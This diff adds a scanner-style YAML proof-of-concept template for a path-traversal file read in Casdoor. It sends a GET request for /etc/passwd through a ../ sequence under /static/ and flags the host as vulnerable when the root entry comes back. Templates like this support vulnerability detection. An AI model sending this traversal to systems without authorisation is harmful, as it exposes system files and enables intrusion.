@@ -1,0 +1,21 @@
+name: poc-yaml-Casdoor-static-readfile
+set:
+  s1: randomInt(1000,9999)
+groups:
+  poc:  
+    - method: GET
+      path: /static/../../../../../../../../../../../etc/passwd
+      headers:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        DNT: 1
+        Cookie: casdoor_session_id=0a2f2dbe922f59ebd72dab8548430946
+        Upgrade-Insecure-Requests: 1
+      body: |
+      expression: >-
+        response.status == 200 && "root:[x*]?:0:0:".bmatches(response.body)
+detail:
+  author: 
+  links:
+  
